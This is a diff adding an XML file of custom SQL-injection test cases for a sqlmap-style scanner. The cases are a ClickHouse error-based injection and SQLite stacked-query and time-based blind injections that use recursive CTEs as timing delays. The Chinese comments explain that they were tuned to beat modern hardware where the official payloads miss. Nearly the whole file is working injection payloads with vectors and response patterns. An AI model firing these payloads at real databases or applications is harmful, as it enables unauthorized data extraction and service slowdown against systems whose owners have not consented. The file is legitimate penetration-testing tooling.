@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- 本工具自定义补充用例（官方用例文件保持逐字节一致便于 diff）：
+     ClickHouse：官方用例无该库。ClickHouse 的 AND 短路求值会跳过 WHERE 中的函数执行，
+     必须套标量子查询强制求值；且内层不能再嵌套标量子查询（26.x 惰性求值会把错误吞成 NULL），
+     故用纯字面量标记。利用阶段取数见 ClickHousePayloadTool.ErrorData 的派生表物化写法。 -->
+<root>
+    <test>
+        <title>ClickHouse AND error-based - WHERE clause (toInt32 via scalar subquery)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT toInt32(concat('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))=1</vector>
+        <request>
+            <payload>AND (SELECT toInt32(concat('[DELIMITER_START]','1','[DELIMITER_STOP]')))=1</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+    <!-- SQLite 堆叠补充：官方heavy query用例（RANDOMBLOB([SLEEPTIME]00000000/2)）在现代硬件上
+         100MB仅耗时约0.4秒，达不到延时阈值导致堆叠漏检。改用递归CTE计时，行数随[SLEEPTIME]
+         线性增长（10M行/秒级≈1.35秒），可通过变时复测与零延时对照。 -->
+    <test>
+        <title>SQLite &gt; 2.0 stacked queries (recursive CTE - comment)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x&lt;[SLEEPTIME]0000000) SELECT count(*) FROM c</vector>
+        <request>
+            <payload>;WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x&lt;[SLEEPTIME]0000000) SELECT count(*) FROM c</payload>
+            <comment>-- </comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+    <!-- SQLite 时间盲注补充：官方heavy query用例（RANDOMBLOB([SLEEPTIME]00000000/2)）在现代硬件上
+         50MB仅耗时约0.2秒，低于延时阈值导致时间盲注漏检（实测Level=3全量发出无一命中）。
+         递归CTE行数随[SLEEPTIME]线性增长（10M行≈1.35秒），基准/变时/零延时三段确认可区分。
+         CASE WHEN惰性求值保证假条件零延时。 -->
+    <test>
+        <title>SQLite &gt; 2.0 AND time-based blind (recursive CTE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x&lt;[SLEEPTIME]0000000) SELECT count(*) FROM c) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x&lt;[SLEEPTIME]0000000) SELECT count(*) FROM c)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+    <test>
+        <title>SQLite &gt; 2.0 OR time-based blind (recursive CTE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x&lt;[SLEEPTIME]0000000) SELECT count(*) FROM c) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x&lt;[SLEEPTIME]0000000) SELECT count(*) FROM c)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+</root>
